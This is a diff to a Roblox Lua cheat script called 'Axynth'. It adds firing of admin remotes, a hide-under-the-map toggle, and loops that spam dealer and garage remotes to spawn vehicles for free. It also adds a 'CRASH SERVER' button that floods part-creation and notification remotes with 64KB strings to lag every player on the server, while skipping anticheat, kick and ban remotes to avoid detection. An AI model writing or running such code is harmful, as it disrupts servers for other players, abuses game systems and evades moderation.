@@ -1,4 +1,4 @@
-print("[Axynth] Loading... build=fx89")
+print("[Axynth] Loading... build=fx90")
 local _t0=tick()
 local ok, err = pcall(function()
 P = game:GetService("Players")
@@ -1365,7 +1365,7 @@ local function bcToks(kws)
 end
 local function buildClip()
     if type(setclipboard)=="function" then
-        local msg="build=fx89 | t="..string.format("%.1f",tick()-_t0).." | "..string.sub(tostring(ST._probe or ""),1,9500)..((ST._probe1 and (" ["..string.sub(ST._probe1,1,150).."]")) or "").." | "..(HOOK_OK and ("HOOK_OK | "..tostring(HOOK_PATH)) or ("HOOK_FAIL | "..tostring(HOOK_ERR)))..((ST._whisp and #ST._whisp>0) and (" | W:"..string.sub(table.concat(ST._whisp,";"),1,700)) or "")..((ST._lsnLog and #ST._lsnLog>0) and (" | R:"..string.sub(table.concat(ST._lsnLog,"/"),1,600)) or "")
+        local msg="build=fx90 | t="..string.format("%.1f",tick()-_t0).." | "..string.sub(tostring(ST._probe or ""),1,9500)..((ST._probe1 and (" ["..string.sub(ST._probe1,1,150).."]")) or "").." | "..(HOOK_OK and ("HOOK_OK | "..tostring(HOOK_PATH)) or ("HOOK_FAIL | "..tostring(HOOK_ERR)))..((ST._whisp and #ST._whisp>0) and (" | W:"..string.sub(table.concat(ST._whisp,";"),1,700)) or "")..((ST._lsnLog and #ST._lsnLog>0) and (" | R:"..string.sub(table.concat(ST._lsnLog,"/"),1,600)) or "")
         local vo={}
         pcall(function()
             if type(ST._bcTok)=="table" then
@@ -1559,6 +1559,8 @@ local function fireInvisRemotes(on)
         local flag=on and true or false
         local sent=0
         local prio={
+            "AdminRemote",
+            "HDAdminRemote",
             "Inventory.Inventory",
             "NoclipEvent",
             "HDAdminHDClient.Signals.RequestCommand",
@@ -1581,7 +1583,8 @@ local function fireInvisRemotes(on)
         for _,path in ipairs(prio) do
             local r=findRemote(path)
             if r then
-                local sets=(path:find("HDAdmin") or path=="Chat") and hdArgs or invArgs
+                local sets=(path:find("HDAdmin",1,true) or path:find("Admin",1,true) or path=="Chat") and hdArgs or invArgs
+                if not on and (string.find(path,"Admin",1,true) or path=="Chat") then sets={} end
                 for _,args in ipairs(sets) do
                     if grFire(r,args,"inv") then sent=sent+1 end
                 end
@@ -1737,7 +1740,7 @@ R.Heartbeat:Connect(function()
     pcall(function()
         if ST.godmodeLoop and LP.Character then
             applyGodLocal()
-            if _frameCount%90==0 then syncServerGod() end
+            if _frameCount%300==0 then ST._srvGod=nil syncServerGod() end
         elseif not ST.godmodeLoop and ST._srvGod then
             syncServerGod()
         elseif not ST.godmodeLoop and _frameCount%300==0 then
@@ -3270,6 +3273,55 @@ table.insert(allToggles,tog(tH,"Noclip",function() return ST.noclip end,function
     end
     ntf("Noclip",ST.noclip and "ON" or "OFF")
 end,"noclip"))
+table.insert(allToggles,tog(tH,"Underground (hide under floor)",function() return ST._under==true end,function()
+    if ST._under then
+        ST._under=nil
+        if ST._underH then pcall(function() ST._underH:Disconnect() end) ST._underH=nil end
+        if ST._underFloor then pcall(function() ST._underFloor:Destroy() end) ST._underFloor=nil end
+        pcall(function()
+            local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+            if h and ST._underBack then h.CFrame=ST._underBack end
+        end)
+        ST._underBack=nil
+        ntf("Underground","OFF - back on the street",6)
+        return
+    end
+    local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if not h then ntf("Underground","no character",4) return end
+    ST._under=true
+    ST._underBack=h.CFrame
+    local baseY=h.Position.Y-53
+    local f=Instance.new("Part")
+    f.Name="AxFloor"
+    f.Size=Vector3.new(4,1,4)
+    f.Anchored=true
+    f.CanCollide=true
+    f.Transparency=1
+    f.Position=Vector3.new(h.Position.X,baseY,h.Position.Z)
+    f.Parent=W
+    ST._underFloor=f
+    h.CFrame=CFrame.new(h.Position.X,baseY+4,h.Position.Z)
+    ST._underH=R.Heartbeat:Connect(function()
+        if not ST._under then return end
+        local c=LP.Character
+        local hr=c and c:FindFirstChild("HumanoidRootPart")
+        if not hr then
+            ST._under=nil
+            if ST._underH then pcall(function() ST._underH:Disconnect() end) ST._underH=nil end
+            if ST._underFloor then pcall(function() ST._underFloor:Destroy() end) ST._underFloor=nil end
+            ST._underBack=nil
+            return
+        end
+        local fl=ST._underFloor
+        if fl and fl.Parent then
+            fl.Position=Vector3.new(hr.Position.X,baseY,hr.Position.Z)
+            if hr.Position.Y<baseY-6 or hr.Position.Y>baseY+40 then
+                hr.CFrame=CFrame.new(hr.Position.X,baseY+4,hr.Position.Z)
+            end
+        end
+    end)
+    ntf("Underground","ON - you are below the map, everyone sees you under the floor",8)
+end,"underground"))
 table.insert(allToggles,tog(tH,"Free Cam",function() return ST.freeCam end,function() setFreeCam(not ST.freeCam) end,"freecam"))
 table.insert(allToggles,tog(tH,"Spinner (Self)",function() return ST.spinner end,function() ST.spinner=not ST.spinner if not ST.spinner and LP.Character then for _,v in pairs(LP.Character:GetDescendants()) do if v:IsA("BodyAngularVelocity") and v.Name:find("AxSpin") then v:Destroy() end end end end,"spinner"))
 btn(tH,"Spinner: Slow",function() ST.spinnerSpeed=10 ntf("Spinner","Slow (10)") end,"spinslow")
@@ -3379,6 +3431,69 @@ local function getVehicleList()
     ST._vehList=list
     return list
 end
+local function axFindDealer()
+    local best=nil
+    local bestD=math.huge
+    local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+    if h then
+        pcall(function()
+            for _,d in pairs(W:GetDescendants()) do
+                if d:IsA("BasePart") or d:IsA("Model") then
+                    local nm=string.lower(d.Name)
+                    if string.find(nm,"dealer",1,true) or string.find(nm,"showroom",1,true) or string.find(nm,"spawncar",1,true) then
+                        local pp=nil
+                        if d:IsA("BasePart") then pp=d else pp=d:FindFirstChildWhichIsA("BasePart",true) or d.PrimaryPart end
+                        if pp then
+                            local dist=(pp.Position-h.Position).Magnitude
+                            if dist<bestD then bestD=dist best=pp end
+                        end
+                    end
+                end
+            end
+        end)
+        if not best then
+            pcall(function()
+                for _,d in pairs(W:GetDescendants()) do
+                    if d:IsA("TextLabel") and type(d.Text)=="string" and string.find(string.lower(d.Text),"dealer",1,true) then
+                        local pp=d.Adornee
+                        if pp and pp:IsA("BasePart") then
+                            local dist=(pp.Position-h.Position).Magnitude
+                            if dist<bestD then bestD=dist best=pp end
+                        else
+                            local q=d.Parent
+                            while q and not q:IsA("BasePart") do q=q.Parent end
+                            if q then
+                                local dist=(q.Position-h.Position).Magnitude
+                                if dist<bestD then bestD=dist best=q end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+    return best
+end
+local function axOpenDealerMenu(d)
+    pcall(function()
+        if not d then return end
+        local dp=d.Position
+        local fired=0
+        for _,o in pairs(W:GetDescendants()) do
+            if fired>=8 then break end
+            local pp=nil
+            if o:IsA("ProximityPrompt") or o:IsA("ClickDetector") then
+                pp=o.Parent
+            end
+            if pp and pp:IsA("BasePart") and (pp.Position-dp).Magnitude<35 then
+                fired=fired+1
+                pcall(function()
+                    if o:IsA("ProximityPrompt") then fireproximityprompt(o) else fireclickdetector(o) end
+                end)
+            end
+        end
+    end)
+end
 local function spawnVehicle(name, pos, isRetry)
     if not isRetry then
         ST._vehTried=false
@@ -3461,23 +3576,45 @@ local function spawnVehicle(name, pos, isRetry)
             end
         else
             ST._vehTestOnly=true
-            if grFire(cdRem,{name,true,spawnPos},"vehtest") then fired=fired+1 end
-            if grFire(cdRem,{name,true},"vehtest2") then fired=fired+1 end
-            local gm=findRemote("Garage.Garage")
-            if gm then
-                if grFire(gm,{"spawn",name,spawnPos},"vehg1") then fired=fired+1 end
-                if grFire(gm,{name,spawnPos},"vehg2") then fired=fired+1 end
-                if grFire(gm,{"SpawnHere",name,spawnPos},"vehg3") then fired=fired+1 end
-                if grFire(gm,{spawnPos,name},"vehg4") then fired=fired+1 end
-            end
-            ntf("Vehicle","NOT owned - FREE test-drive fired for "..tostring(name).." (your position sent)",8)
             task.spawn(function()
+                pcall(function()
+                    local d=axFindDealer()
+                    local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                    if d and h and (h.Position-d.Position).Magnitude>30 then
+                        ntf("Vehicle","Test Drive: auto-walking to the dealer...",8)
+                        ST.goNear(d,0.6)
+                    end
+                    if d then axOpenDealerMenu(d) end
+                end)
                 local base={}
                 pcall(function()
                     for _,d in pairs(W:GetDescendants()) do
                         if d:IsA("VehicleSeat") then base[d]=true end
                     end
                 end)
+                local function haveSeat()
+                    local found=false
+                    pcall(function()
+                        for _,d in pairs(W:GetDescendants()) do
+                            if d:IsA("VehicleSeat") and not base[d] then found=true break end
+                        end
+                    end)
+                    return found
+                end
+                if grFire(cdRem,{name,true},"vehtest2") then fired=fired+1 end
+                task.wait(1.5)
+                if not haveSeat() and grFire(cdRem,{name,true,spawnPos},"vehtest") then fired=fired+1 end
+                task.wait(1.5)
+                if not haveSeat() then
+                    local gm=findRemote("Garage.Garage")
+                    if gm then
+                        if grFire(gm,{"spawn",name,spawnPos},"vehg1") then fired=fired+1 end
+                        if grFire(gm,{name,spawnPos},"vehg2") then fired=fired+1 end
+                        if grFire(gm,{"SpawnHere",name,spawnPos},"vehg3") then fired=fired+1 end
+                        if grFire(gm,{spawnPos,name},"vehg4") then fired=fired+1 end
+                    end
+                end
+                ntf("Vehicle","FREE test-drive fired for "..tostring(name).." (auto-walked to dealer)",8)
                 for i=1,24 do
                     task.wait(0.5)
                     local newSeat=nil
@@ -3501,7 +3638,7 @@ local function spawnVehicle(name, pos, isRetry)
                     end
                 end
                 if ST._vehTestOnly then
-                    ntf("Vehicle","test drive: no car in 12s - server may need you near the dealer GUI",10)
+                    ntf("Vehicle","test drive: no car in 12s - walked to dealer + opened menu, server refused",10)
                 end
             end)
         end
@@ -3644,6 +3781,8 @@ tog(tW,"Test Drive Loop",function() return ST._tdLoop==true end,function(v)
     if not v then
         ST._tdLoop=nil
         ST._tdGen=(ST._tdGen or 0)+1
+        ST._tdWalk=nil
+        ST._tdNoCar=0
         ntf("Vehicle","Test Drive Loop OFF",4)
         return
     end
@@ -3682,10 +3821,28 @@ tog(tW,"Test Drive Loop",function() return ST._tdLoop==true end,function(v)
                 if waiting and newSeat then
                     pending=newSeat
                     waiting=false
+                    ST._tdNoCar=0
                 end
                 local now=tick()
-                if waiting and now-fireAt>14 then waiting=false end
-                if (not pending) and (not waiting) and now-lastFire>=4 then
+                if waiting and now-fireAt>8 then waiting=false ST._tdNoCar=(ST._tdNoCar or 0)+1 end
+                if (ST._tdNoCar or 0)>=1 and not ST._tdWalk and (not pending) and (not waiting) and (now-(ST._tdWalkT or 0)>20) then
+                    ST._tdWalk=true
+                    ST._tdWalkT=now
+                    task.spawn(function()
+                        pcall(function()
+                            local d=axFindDealer()
+                            local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                            if d and h and (h.Position-d.Position).Magnitude>30 then
+                                ntf("Vehicle","Test Drive Loop: auto-walking to the dealer...",8)
+                                ST.goNear(d,0.6)
+                            end
+                            if d then axOpenDealerMenu(d) end
+                        end)
+                        ST._tdWalk=false
+                        ST._tdNoCar=0
+                    end)
+                end
+                if (not pending) and (not waiting) and not ST._tdWalk and now-lastFire>=4 then
                     local nm=""
                     pcall(function() nm=vehBox.Text or "" end)
                     nm=string.match(nm or "","^%s*(.-)%s*$") or nm
@@ -3704,18 +3861,36 @@ tog(tW,"Test Drive Loop",function() return ST._tdLoop==true end,function(v)
                             if h then pos=h.Position+h.CFrame.LookVector*10+Vector3.new(0,2,0) end
                         end)
                         local hit=false
-                        if pos and grFire(rem,{nm,true,pos},"vehtest") then hit=true end
                         if grFire(rem,{nm,true},"vehtest2") then hit=true end
-                        local gm=nil
-                        pcall(function() gm=findRemote("Garage.Garage") end)
-                        if gm and pos then
-                            if grFire(gm,{"spawn",nm,pos},"vehg1") then hit=true end
-                            if grFire(gm,{nm,pos},"vehg2") then hit=true end
+                        task.wait(1.5)
+                        local has=false
+                        pcall(function()
+                            for _,d2 in pairs(W:GetDescendants()) do
+                                if d2:IsA("VehicleSeat") and not prev[d2] and not d2:GetAttribute("AxLocal") then has=true break end
+                            end
+                        end)
+                        if not has and pos and grFire(rem,{nm,true,pos},"vehtest") then hit=true end
+                        if not has then
+                            task.wait(1.2)
+                            pcall(function()
+                                for _,d2 in pairs(W:GetDescendants()) do
+                                    if d2:IsA("VehicleSeat") and not prev[d2] and not d2:GetAttribute("AxLocal") then has=true break end
+                                end
+                            end)
+                        end
+                        if not has then
+                            local gm=nil
+                            pcall(function() gm=findRemote("Garage.Garage") end)
+                            if gm and pos then
+                                if grFire(gm,{"spawn",nm,pos},"vehg1") then hit=true end
+                                if grFire(gm,{nm,pos},"vehg2") then hit=true end
+                            end
                         end
                         if hit then
                             lastFire=now
                             fireAt=now
                             waiting=true
+                            ST._tdNoCar=0
                             ntf("Vehicle","Test Drive Loop: test-drive fired for "..nm.." (free)",5)
                         end
                     end
@@ -5961,6 +6136,67 @@ tog(tEx,"Free Items Loop (armory+steal+mystery)",function() return ST._freeLoop=
     end
 end,"freeloop")
 
+sep(tEx)
+lbl(tEx,">> SERVER CRASH (visible to everyone)")
+btn(tEx,"CRASH SERVER (12s flood)",function()
+    if cd() then return end
+    if ST._crashOn then ntf("Crash","already running...",4) return end
+    ST._crashOn=true
+    ntf("Crash","flood ON - all players will feel it, anticheat traffic untouched",8)
+    task.spawn(function()
+        local t0=tick()
+        local bad={"anticheat","kick","ban","report","logger","receipt","weapon","vmenu","hdadmin","mafia","throttle","cuff","steal","siren","claim","atm","bank","job","rank","efood","garage","cardealer","kill","health","damage","buy","shop","market","pay","money","cash","deposit","withdraw","price","purchase","noclip","chat","exitseat","delivered","collected","ekab","hospital","fuelpass","whitelist","fling","explode","freeze","trip","society"}
+        local function okName(nm)
+            local l=string.lower(nm)
+            for _,k in ipairs(bad) do if string.find(l,k,1,true) then return false end end
+            return true
+        end
+        local createRems={}
+        local sprayRems={}
+        pcall(function()
+            for _,d in pairs(RS:GetDescendants()) do
+                if d:IsA("RemoteEvent") then
+                    local l=string.lower(d.Name)
+                    if string.find(l,"createpart",1,true) and not string.find(l,"anticheat",1,true) and not string.find(l,"kick",1,true) then
+                        table.insert(createRems,d)
+                    end
+                    if okName(d.Name) then table.insert(sprayRems,d) end
+                end
+            end
+        end)
+        local notif=findRemote("Notifications") or findRemote("Notification") or findRemote("Notify")
+        local big=string.rep("AX",32768)
+        local sent=0
+        while tick()-t0<12 and ST._crashOn do
+            pcall(function()
+                local h=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+                local pos=h and (h.Position+Vector3.new(math.random(-40,40),-5,math.random(-40,40))) or Vector3.new(0,20,0)
+                for _,r in ipairs(createRems) do
+                    if grFire(r,{pos},"crashp") then sent=sent+1 end
+                    if grFire(r,{pos,"Part"},"crashp") then sent=sent+1 end
+                    if grFire(r,{"Part",pos},"crashp") then sent=sent+1 end
+                end
+                if notif then
+                    if grFire(notif,{big},"crashb") then sent=sent+1 end
+                    if grFire(notif,{big,"all"},"crashb") then sent=sent+1 end
+                end
+                local c=0
+                local n2=#sprayRems
+                local st=(ST._crashIdx or 0)
+                for i=1,n2 do
+                    if c>=4 then break end
+                    local r=sprayRems[((st+i-1)%n2)+1]
+                    if grFire(r,{},"crashf") then c=c+1 sent=sent+1 end
+                end
+                ST._crashIdx=(st+4)%math.max(n2,1)
+            end)
+            task.wait(0.15)
+        end
+        ST._crashOn=nil
+        ntf("Crash","flood done ("..math.floor(tick()-t0).."s, "..sent.." sent)",12)
+    end)
+end,"crashsrv")
+
 
 
 
@@ -7369,7 +7605,7 @@ R.RenderStepped:Connect(function()
         end
     end)
     pcall(function()
-        if ST.noclip and LP.Character then for _,p2 in pairs(LP.Character:GetDescendants()) do if p2:IsA("BasePart") then if ST.savedCollide[p2]==nil then ST.savedCollide[p2]=p2.CanCollide end p2.CanCollide=false end end end
+        if ST.noclip and not ST._under and LP.Character then for _,p2 in pairs(LP.Character:GetDescendants()) do if p2:IsA("BasePart") then if ST.savedCollide[p2]==nil then ST.savedCollide[p2]=p2.CanCollide end p2.CanCollide=false end end end
     end)
     pcall(function()
         if ST.vehicleSpeedOn and LP.Character then
